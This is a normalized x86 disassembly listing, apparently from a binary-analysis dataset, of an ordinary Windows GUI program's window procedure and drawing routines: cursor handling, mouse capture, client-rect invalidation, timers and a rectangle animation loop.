mov esi [ rw-data ]
add esp 0x20
mov [ rw-data ] 0x1
push ebx
call [ ShowCursor@IAT ]
mov [ rw-data ] bl
mov edx [ esp + 0x18 ]
fild [ rw-data ]
sub edx ecx
mov ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] edx
mov edx [ rw-data ]
sub ecx eax
cmp ebx 0x14
mov [ esp + 0x1c ] ecx
mov [ esp + 0x14 ] edx
jne r-xdata
xor eax eax
mov eax [ rw-data ]
mov edx [ rw-data ]
mov esi [ rw-data ]
mov ecx [ rw-data ]
mov edi [ rw-data ]
push edx
mov [ rw-data ] eax
lea eax [ ebx - 0x1 ]
push 0x1
push eax
mov [ rw-data ] ecx
call sub_48a5f0
add esp 0xc
mov [ rw-data ] esi
mov [ rw-data ] edi
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
cmp esi 0x4
je r-xdata
mov ecx [ rw-data ]
push ecx
lea edx [ ebx - 0x1 ]
push 0x1
push edx
call sub_48a5f0
add esp 0xc
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
test eax eax
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov ebp [ esp + 0xa0 ]
mov [ esp + 0x14 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] edx
mov edx [ rw-data ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
jne r-xdata
cmp esi 0x4
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push 0x0
push ebx
push 0x111
push edx
call [ SendMessageA@IAT ]
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp edx 0x1
mov edx [ rw-data ]
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
cmp edx 0x4
jne r-xdata
cmp ebx 0x1
jne r-xdata
mov eax [ rw-data ]
push eax
call [ GetDC@IAT ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov edi eax
mov eax [ esp + 0x18 ]
cmp ecx eax
jne r-xdata
cmp ebx edx
je r-xdata
fmul [ r--data ]
fdivr [ rw-data ]
fmul [ rw-data ]
fmul [ r--data ]
jmp r-xdata
mov ecx [ rw-data ]
push ecx
dec ebx
push 0x1
push ebx
call sub_48a5f0
lea eax [ esp + 0x48 ]
push eax
lea ecx [ esp + 0x6c ]
push ecx
call sub_45e3f0
mov eax [ esp + 0x5c ]
add esp 0x8
xor ebx ebx
xor edi edi
test eax eax
mov eax [ esp + 0x24 ]
jle r-xdata
mov eax 0x3e7
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
mov eax [ rw-data ]
push sub_45cdc0
push 0xc8
push 0x2
push eax
call [ SetTimer@IAT ]
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
push 0x0
push 0x0
push 0x0
push ecx
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x28 ]
push eax
mov eax [ esp + 0x30 ]
push edx
push eax
push ecx
call sub_477a80
mov al [ rw-data ]
add esp 0x20
test al al
mov [ rw-data ] 0x0
je r-xdata
mov ebp [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
sub ecx ebp
imul ecx edx
sub eax esi
imul eax edx
push 0x0
push ecx
push eax
call sub_47ae00
add esp 0xc
mov edx [ esp + 0x3c ]
cmp ebx 0x3
je r-xdata
cmp ebx 0x1
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov ecx [ rw-data ]
push 0x14a
push 0xfffffffa
push ecx
call ebp
push eax
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
push edx
push eax
call sub_46cf30
add esp 0x8
mov [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
cmp eax ecx
jge r-xdata
mov edx [ esp + 0x1c ]
cmp esi edx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov eax [ esp + 0x14 ]
fstp [ rw-data ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
push ecx
push edx
push 0x1
push 0x0
push eax
call sub_466930
add esp 0x18
mov ecx [ esp + 0x74 ]
test ecx ecx
cmp eax 0x11
je r-xdata
push 0x0
call [ ShowCursor@IAT ]
mov [ rw-data ] 0x0
cmp ebx 0x4
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push 0x14b
push 0xfffffffa
push ecx
call ebp
push eax
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov edx [ rw-data ]
mov [ rw-data ] edx
jmp r-xdata
cmp ebx 0x3
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
push ecx
mov ecx [ rw-data ]
push edx
mov edx [ rw-data ]
push eax
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x28 ]
push edx
push eax
push ecx
call sub_46d030
add esp 0x1c
test eax eax
je r-xdata
mov [ esp + 0x2c ] ecx
mov [ esp + 0x34 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] ecx
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx eax
jge r-xdata
cmp ebx 0x4
jne r-xdata
mov eax [ esp + 0x18 ]
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
push eax
push edi
push ebx
call sub_47ae00
jmp r-xdata
cmp eax 0x10
je r-xdata
cmp eax 0x10
je r-xdata
cmp eax 0x13
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x40000064
jne r-xdata
call sub_460b20
test eax eax
je r-xdata
mov edx [ rw-data ]
push edx
call [ GetDC@IAT ]
mov esi eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ esp + 0x30 ] esi
mov [ esp + 0x38 ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x38 ] esi
jmp r-xdata
mov eax [ rw-data ]
cmp eax esi
jge r-xdata
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x34 ] eax
jmp r-xdata
mov eax [ rw-data ]
push eax
call [ GetDC@IAT ]
mov ecx [ rw-data ]
mov esi eax
mov eax [ rw-data ]
cmp eax ecx
jge r-xdata
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x34 ] eax
jmp r-xdata
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov ebx [ esp + 0x30 ]
mov [ rw-data ] eax
add esp 0xc
mov [ rw-data ] edx
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
neg ebp
cmp eax 0x12
je r-xdata
neg ebp
cmp eax 0x11
jne r-xdata
mov ecx [ esp + 0x74 ]
test ecx ecx
jne r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x48 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x50 ]
mov ebp [ esp + 0x48 ]
mov esi [ rw-data ]
sub eax ebp
cdq
sub eax edx
mov edx [ esp + 0x4c ]
mov ecx eax
mov eax [ esp + 0x54 ]
sub eax edx
cdq
sub eax edx
mov edx [ rw-data ]
mov [ esp + 0x3c ] edx
mov edx [ esp + 0x1c ]
sar ecx 0x1
sar eax 0x1
sub edx esi
mov [ esp + 0x14 ] edx
fild [ esp + 0x14 ]
fmul [ r--data ]
jns r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
push eax
call sub_45ba40
jmp r-xdata
cmp [ rw-data ] 0x40000064
jne r-xdata
mov ecx [ rw-data ]
push ecx
dec eax
push 0x1
push eax
call sub_48a5f0
add esp 0xc
mov ecx [ rw-data ]
lea edx [ esp + 0x3c ]
push edx
push esi
mov [ rw-data ] ecx
mov [ rw-data ] 0x64
call sub_473580
mov eax [ rw-data ]
add esp 0x8
push esi
push eax
call [ ReleaseDC@IAT ]
mov esi [ esp + 0x3c ]
cmp [ rw-data ] esi
jle r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
push eax
call sub_45ba40
lea ecx [ esp + 0x2c ]
push ecx
push edi
call sub_45d640
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
add esp 0x8
mov [ esp + 0x30 ] edx
mov [ esp + 0x38 ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x38 ] edx
jmp r-xdata
mov eax [ rw-data ]
cmp eax edx
jge r-xdata
mov [ esp + 0x2c ] ecx
mov [ esp + 0x34 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] ecx
jmp r-xdata
mov ebp eax
mov ebx edi
mov ebp edi
mov ebx eax
jmp r-xdata
mov eax [ esp + 0x1c ]
cmp edi eax
jge r-xdata
cmp eax 0x11
jne r-xdata
mov ecx [ esp + 0x54 ]
test ecx ecx
jne r-xdata
mov esi [ rw-data ]
mov ecx esi
imul ecx [ esp + 0x58 ]
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx esi
imul ecx [ esp + 0x54 ]
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x18 ] edx
mov eax 0x51eb851f
imul ecx
mov eax [ esp + 0x24 ]
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x1c ] edx
mov edx [ rw-data ]
mov [ esp + 0x20 ] esi
mov edi [ esp + edx * 4 + 0x18 ]
imul edi ebp
jle r-xdata
fadd [ r--data ]
fdivr [ rw-data ]
fsubr [ r--data ]
fmul [ rw-data ]
jmp r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push edx
call sub_45ba40
jmp r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x48 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x54 ]
mov ebp [ esp + 0x40 ]
mov ecx [ rw-data ]
sub eax ebp
push 0x0
lea edx [ esp + 0x4c ]
mov [ esp + 0x50 ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0x54 ] esi
mov [ esp + 0x5c ] ecx
call [ InvalidateRect@IAT ]
lea edx [ esp + 0x2c ]
push edx
push edi
call sub_45d640
mov eax [ rw-data ]
add esp 0x8
push edi
push eax
call [ ReleaseDC@IAT ]
jmp r-xdata
mov [ esp + 0x30 ] ecx
mov [ esp + 0x38 ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x38 ] ecx
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp eax ecx
jge r-xdata
mov eax ebx
sub eax ebp
cmp eax 0x10
mov [ esp + 0x14 ] eax
jle r-xdata
mov eax [ esp + 0x34 ]
sub eax [ esp + 0x2c ]
cmp eax 0x10
mov [ esp + 0x10 ] eax
jle r-xdata
mov esi [ rw-data ]
mov ecx esi
imul ecx [ esp + 0x78 ]
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx esi
imul ecx [ esp + 0x74 ]
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x18 ] edx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x1c ] edx
mov edx [ rw-data ]
mov [ esp + 0x20 ] esi
mov ebx [ esp + edx * 4 + 0x18 ]
imul ebx ebp
mov edx [ esp + 0x3c ]
fstp [ rw-data ]
push edx
push eax
mov eax [ rw-data ]
push ecx
push 0x1
push 0x0
push eax
call sub_466930
mov ecx [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
mov edx [ rw-data ]
push edx
call [ UpdateWindow@IAT ]
jmp r-xdata
lea ecx [ esp + 0x2c ]
push ecx
push esi
call sub_45d640
mov edx [ rw-data ]
add esp 0x8
push esi
push edx
call [ ReleaseDC@IAT ]
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x68 ]
push ecx
push edx
call [ GetClientRect@IAT ]
fld [ rw-data ]
mov ecx [ esp + 0x68 ]
mov eax [ esp + 0x70 ]
mov edi [ esp + 0x6c ]
mov edx [ rw-data ]
sub eax ecx
mov ecx [ esp + 0x74 ]
sub ecx edi
mov [ rw-data ] edx
mov edx [ rw-data ]
mov [ esp + 0x44 ] eax
mov esi eax
imul eax [ esp + 0x14 ]
mov [ esp + 0x28 ] ecx
mov edi ecx
imul ecx [ esp + 0x10 ]
cmp eax ecx
mov [ rw-data ] edx
mov edx [ rw-data ]
mov [ rw-data ] edx
mov edx [ esp + 0x2c ]
mov [ esp + 0x48 ] edx
mov edx [ esp + 0x34 ]
mov [ esp + 0x4c ] ebp
mov [ esp + 0x50 ] edx
mov [ esp + 0x54 ] ebx
jge r-xdata
fild [ esp + 0x28 ]
fidiv [ esp + 0x14 ]
fild [ esp + 0x44 ]
fidiv [ esp + 0x10 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jge r-xdata
xor ecx ecx
mov eax [ rw-data ]
fmul st1
push eax
push ecx
fstp [ esp + 0x1c ]
mov ecx esp
mov [ esp + 0x44 ] esp
push rw-data
fstp st0
call sub_40a740
push ecx
mov ecx esp
mov [ esp + 0x48 ] esp
push rw-data
call sub_40a740
push 0x1
lea ecx [ esp + 0x54 ]
push ecx
lea edx [ esp + 0x3c ]
push edx
lea eax [ esp + 0x54 ]
push eax
lea ecx [ esp + 0x80 ]
push ecx
call sub_45ddb0
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x90 ]
mov edx [ esp + 0x88 ]
sub eax ecx
sub eax edx
cdq
sub eax edx
mov edx [ esp + 0x64 ]
mov ecx eax
mov eax [ esp + 0x94 ]
sub eax edx
sub eax [ esp + 0x8c ]
cdq
sub eax edx
sar ecx 0x1
sar eax 0x1
add esp 0x20
test ecx ecx
mov [ esp + 0x10 ] eax
jge r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x2c ]
add eax edx
cdq
sub eax edx
sar eax 0x1
sub eax ecx
add eax [ rw-data ]
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
push ecx
fdiv [ rw-data ]
fstp [ esp ]
call sub_452500
mov [ esp + 0x48 ] eax
lea eax [ ebx + ebp ]
mov ebp [ esp + 0x14 ]
mov ebx [ rw-data ]
cdq
sub eax edx
sar eax 0x1
sub eax ebp
add eax ebx
mov [ esp + 0x2c ] eax
fild [ esp + 0x2c ]
fdiv [ rw-data ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov [ esp + 0x28 ] eax
call [ GetTickCount@IAT ]
fild [ esp + 0x48 ]
mov ecx [ rw-data ]
mov ebx [ InvalidateRect@IAT ]
fstp [ esp + 0x8c ]
mov ebp [ ValidateRect@IAT ]
fild [ esp + 0x50 ]
mov [ esp + 0x88 ] eax
mov [ esp + 0x3c ] ecx
fstp [ esp + 0x84 ]
fild [ esp + 0x4c ]
fstp [ esp + 0x90 ]
fild [ esp + 0x54 ]
fstp [ esp + 0x64 ]
fild [ esp + 0x44 ]
fstp [ esp + 0x44 ]
fild [ esp + 0x28 ]
fstp [ esp + 0x28 ]
mov [ esp + 0x10 ] 0x0
fmul [ r--data ]
fst [ esp + 0x10 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
fadd [ r--data ]
push 0x5
call [ Sleep@IAT ]
mov [ esp + 0x10 ] 0x3f800000
jmp r-xdata
mov ecx [ esp + 0x3c ]
mov [ rw-data ] ecx
mov [ rw-data ] 0x0
jmp r-xdata
fld [ r--data ]
fsub [ esp + 0x10 ]
fld [ rw-data ]
fmul st1
fld [ esp + 0x10 ]
fmul [ esp + 0x14 ]
faddp st1
fstp [ rw-data ]
fild [ esp + 0x68 ]
fmul [ esp + 0x10 ]
fld [ esp + 0x8c ]
fmul st2
faddp st1
call sub_4b64c4
fild [ esp + 0x70 ]
mov [ esp + 0x48 ] eax
fmul [ esp + 0x10 ]
fld [ esp + 0x84 ]
fmul st2
faddp st1
call sub_4b64c4
fild [ esp + 0x6c ]
mov [ esp + 0x50 ] eax
fmul [ esp + 0x10 ]
fld [ esp + 0x90 ]
fmul st2
faddp st1
call sub_4b64c4
fild [ esp + 0x74 ]
mov [ esp + 0x4c ] eax
fmul [ esp + 0x10 ]
fld [ esp + 0x64 ]
fmul st2
faddp st1
call sub_4b64c4
fstp st0
fld [ esp + 0x44 ]
push ecx
fmul [ rw-data ]
mov [ esp + 0x58 ] eax
fstp [ esp ]
call sub_452500
fld [ esp + 0x2c ]
mov ecx eax
fmul [ rw-data ]
mov eax esi
cdq
sub eax edx
sar eax 0x1
fstp [ esp ]
sub ecx eax
mov [ rw-data ] ecx
call sub_452500
mov ecx eax
push 0x0
push 0x0
mov eax edi
cdq
push 0x0
sub eax edx
mov edx [ rw-data ]
push 0x0
sar eax 0x1
sub ecx eax
push 0x0
push edx
mov [ rw-data ] ecx
call sub_466930
mov ecx [ rw-data ]
add esp 0x1c
lea eax [ esp + 0x68 ]
push eax
push ecx
call ebp
mov eax [ rw-data ]
push 0x0
lea edx [ esp + 0x4c ]
push edx
push eax
call ebx
fld [ esp + 0x10 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpo r-xdata
call [ GetTickCount@IAT ]
sub eax [ esp + 0x88 ]
test eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0x10 ]
jge r-xdata
mov edx [ rw-data ]
push edx
call sub_466150
add esp 0x4
jmp r-xdata
mov edx [ rw-data ]
push edx
call [ UpdateWindow@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0x68 ]
push eax
push ecx
call [ GetClientRect@IAT ]
fld [ esp + 0x10 ]
fcomp [ r--data ]
mov eax [ esp + 0x6c ]
mov edi [ esp + 0x74 ]
mov esi [ esp + 0x70 ]
mov ecx [ esp + 0x68 ]
sub edi eax
fnstsw ax
sub esi ecx
test ah 0x5
jpo r-xdata
sub_490380
push 0xffffffff
push sub_4c15cb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1ac
push ebx
mov ebx [ esp + 0x1c0 ]
push ebp
mov ebp [ GetWindowLongA@IAT ]
push esi
push edi
push 0xffffffeb
push ebx
mov [ esp + 0x1b ] 0x0
call ebp
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
mov edi [ rw-data ]
cmp ebx edi
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov esi [ esp + 0x1d0 ]
cmp esi 0x117
mov ecx [ esp + 0x1d8 ]
ja r-xdata
mov [ rw-data ] 0x0
mov ecx [ esp + 0x14 ]
mov esi [ ecx + 0x20 ]
test esi esi
mov [ rw-data ] ebx
je r-xdata
cmp esi 0x216
ja r-xdata
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
inc [ esi + 0xd48 ]
cmp esi 0x2a3
ja r-xdata
je r-xdata
lea eax [ ecx - 0x7 ]
cmp eax 0x3
ja r-xdata
cmp esi 0xa0
ja r-xdata
mov [ rw-data ] esi
mov esi [ ecx + 0x24 ]
test esi esi
je r-xdata
mov edx [ eax + 0xd48 ]
mov edi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
cmp esi 0x600
jne r-xdata
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
mov [ rw-data ] 0x1
je r-xdata
lea eax [ esi - 0x200 ]
cmp eax 0xc
ja r-xdata
mov ebx [ esp + 0x1cc ]
jmp [ eax * 4 + jump_table_49310c ]
lea eax [ esi - 0xa1 ]
cmp eax 0x74
ja r-xdata
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
inc [ esi + 0xd48 ]
mov ecx [ esp + 0x14 ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x1d4 ]
push 0x1
push 0x0
push ecx
push ebx
call sub_485220
add esp 0x10
push 0x5
push ebx
call [ ShowWindow@IAT ]
push ebx
call [ SetForegroundWindow@IAT ]
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax esi
sub eax 0x232
je r-xdata
mov ebx [ esp + 0x1cc ]
mov ecx [ eax + 0x12c ]
test ecx ecx
je r-xdata
movzx edx [ eax + lookup_table_493130 ]
jmp [ edx * 4 + jump_table_49311c ]
mov al [ esp + 0x13 ]
test al al
jne r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
push 0xc
mov edx [ esp + 0x1d4 ]
mov eax [ rw-data ]
push 0x0
push edx
push 0x117
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ esp + 0x1d4 ]
mov edx [ rw-data ]
push 0x1
push ecx
push 0x117
push edx
call [ SendMessageA@IAT ]
jmp r-xdata
push 0x2
jmp r-xdata
movzx edx [ eax + lookup_table_493074 ]
jmp [ edx * 4 + jump_table_493060 ]
mov ecx [ esp + 0x1d8 ]
movsx eax cx
mov edx eax
mov [ esp + 0x28 ] eax
mov eax ecx
shr eax 0x10
mov [ esp + 0x48 ] eax
movsx eax ax
mov ebp eax
mov [ esp + 0x44 ] eax
cmp [ esp + 0x1d0 ] 0x200
mov [ esp + 0x40 ] edx
mov [ esp + 0x2c ] ebp
mov esi 0x2
jne r-xdata
lea eax [ esi - 0x1 ]
cmp eax 0x84
ja r-xdata
mov [ rw-data ] esi
mov eax [ ecx + 0x4 ]
mov [ rw-data ] eax
mov edx [ ecx + 0x8 ]
mov [ rw-data ] edx
mov eax [ ecx + 0x14 ]
mov [ rw-data ] eax
mov edx [ ecx + 0xc ]
mov [ rw-data ] edx
mov eax [ ecx + 0x10 ]
mov [ rw-data ] eax
mov dl [ ecx + 0x18 ]
mov [ rw-data ] dl
mov eax [ ecx + 0x128 ]
mov [ rw-data ] eax
mov edx [ ecx + 0x1c ]
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov eax [ ecx + 0x130 ]
mov [ rw-data ] eax
mov edx [ ecx + 0x134 ]
mov [ rw-data ] edx
mov eax [ ecx + 0x138 ]
mov [ rw-data ] eax
mov edx [ ecx + 0x13c ]
mov [ rw-data ] edx
mov eax [ ecx + 0x140 ]
mov [ rw-data ] eax
mov dl [ ecx + 0x144 ]
mov [ rw-data ] dl
mov eax [ ecx + 0x148 ]
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ eax + 0xd48 ]
mov edi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp ebx edi
je r-xdata
dec eax
jne r-xdata
mov ecx [ esp + 0x1bc ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x1b8
retn 0x10
cmp ebx edi
je r-xdata
mov ebx [ esp + 0x1d4 ]
mov eax ebx
shr eax 0x10
movsx ecx ax
mov eax 0x77777777
imul ecx
sub edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x13 ] 0x1
mov ebp edx
jns r-xdata
push ebx
call [ SetFocus@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
movzx edx [ esp + 0x1d4 ]
mov [ esp + 0x13 ] 0x1
mov [ rw-data ] edx
call [ GetCapture@IAT ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov ebp [ esp + 0x14 ]
mov esi [ ebp + 0x20 ]
test esi esi
je r-xdata
inc [ edi + 0xd48 ]
mov eax [ esp + 0x1d8 ]
mov ecx [ rw-data ]
push eax
push 0x117
push ecx
call [ SendMessageA@IAT ]
jmp r-xdata
call [ timeGetTime@IAT ]
mov esi eax
mov eax [ esp + 0x1d4 ]
sub eax 0xa
je r-xdata
mov edx [ esp + 0x1d4 ]
mov eax [ rw-data ]
push ecx
push edx
push esi
push eax
call [ SendMessageA@IAT ]
mov [ esp + 0x13 ] 0x1
jmp r-xdata
push ebx
call [ SetFocus@IAT ]
mov eax [ esp + 0x1d4 ]
cmp eax 0x6
je r-xdata
mov ebp [ esp + 0x1d4 ]
cmp bp 0x5
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
movzx eax [ esp + 0x1d4 ]
mov [ rw-data ] eax
movzx edx [ eax + lookup_table_492fd8 ]
jmp [ edx * 4 + jump_table_492fb4 ]
cmp [ rw-data ] 0x10
mov esi [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov ecx [ esp + 0x14 ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x1
call [ ShowCursor@IAT ]
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov edx [ eax * 4 + rw-data ]
mov eax [ rw-data ]
push 0x0
push 0x1
push 0x0
push ebx
push edx
mov edx [ eax * 4 + rw-data ]
mov eax ecx
push edx
shr eax 0x10
movsx edx ax
movsx eax cx
push edx
push eax
call sub_477a80
add esp 0x20
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov edx [ rw-data ]
mov edi [ rw-data ]
xor esi esi
lea ecx [ edx + 0x4 ]
push ebx
call [ SetForegroundWindow@IAT ]
push ebx
call [ SetFocus@IAT ]
mov edx [ esp + 0x1d4 ]
mov eax [ rw-data ]
push 0x1
push edx
push 0x233
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x1
push 0x14
push 0x20
call esi
mov edi [ esp + 0x1e0 ]
mov ecx [ edi + 0x8 ]
mov ebp [ edi ]
shl eax 0x1
sub ecx eax
sub ecx ebp
push ecx
push 0x21
call esi
mov edx [ edi + 0xc ]
sub edx eax
sub edx 0x14
push edx
push 0x21
call esi
add eax [ edi ]
push eax
mov eax [ esp + 0x28 ]
mov ecx [ eax + 0x12c ]
push ecx
call [ MoveWindow@IAT ]
jmp r-xdata
mov [ esp + 0x28 ] 0x4
mov [ esp + 0x28 ] 0x3
neg ebp
jmp r-xdata
mov ebp [ esp + 0x1cc ]
push r--data
push 0x726
push ebp
mov [ esp + 0x1f ] 0x1
call [ GetParent@IAT ]
push eax
call [ SetDlgItemTextA@IAT ]
mov eax [ esp + 0x1d8 ]
movzx esi [ esp + 0x1d4 ]
mov ecx [ rw-data ]
mov ebx [ rw-data ]
movsx edx ax
shr eax 0x10
movsx eax ax
push ebp
mov [ rw-data ] esi
mov [ esp + 0x38 ] ecx
mov [ rw-data ] edx
mov [ rw-data ] eax
call [ SetCapture@IAT ]
mov ecx [ esp + 0x1d0 ]
xor edx edx
xor edi edi
cmp ecx 0x201
mov eax esi
jne r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov edi [ KillTimer@IAT ]
push 0xa
push ebx
call edi
mov eax [ rw-data ]
test eax eax
mov ecx [ rw-data ]
jne r-xdata
call [ ReleaseCapture@IAT ]
mov eax [ esp + 0x1d8 ]
mov ecx [ esp + 0x1d4 ]
mov edx [ esp + 0x1d0 ]
push eax
push ecx
push edx
push ebx
call [ DefWindowProcA@IAT ]
jmp r-xdata
mov [ ebp + 0x20 ] edi
mov eax [ rw-data ]
test eax eax
mov edi eax
je r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov eax esi
sub eax edx
cmp eax ecx
jl r-xdata
dec eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp eax 0x7
jne r-xdata
cmp esi 0x114
jne r-xdata
lea ecx [ esp + 0x30 ]
push ecx
call [ GetCursorPos@IAT ]
movzx edx [ esp + 0x34 ]
movzx eax [ esp + 0x30 ]
shl edx 0x10
or edx eax
push edx
push 0x0
push 0x84
push ebx
call [ SendMessageA@IAT ]
cmp eax 0x6
jne r-xdata
push esi
push 0x0
push 0x3
push eax
call sub_48efa0
mov eax [ rw-data ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x150
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
mov ebp [ rw-data ]
mov edx [ rw-data ]
xor edi edi
xor esi esi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov esi [ esp + 0x1d8 ]
shr esi 0x10
call [ GetFocus@IAT ]
mov edi eax
push 0x3
push edi
call [ GetAncestor@IAT ]
mov ecx [ rw-data ]
cmp edi ecx
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax esi
add ecx 0x108
lea edi [ eax + 0x1 ]
mov esi rw-data
mov esi rw-data
jmp r-xdata
mov esi [ rw-data ]
jmp r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
push 0x0
push 0xffffffff
mov [ rw-data ] eax
call sub_472de0
add esp 0x8
mov eax edi
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ rw-data ]
test al 0x1
mov [ esp + 0x40 ] eax
je r-xdata
cmp ecx 0x204
jne r-xdata
mov edi 0x1
and eax 0xfffffffe
jmp r-xdata
mov edi [ rw-data ]
xor edx edx
test edi edi
setne dl
xor edi edi
add edx 0x3
cmp eax edi
mov esi edx
je r-xdata
test ecx ecx
jne r-xdata
mov esi [ ebp + 0x24 ]
test esi esi
je r-xdata
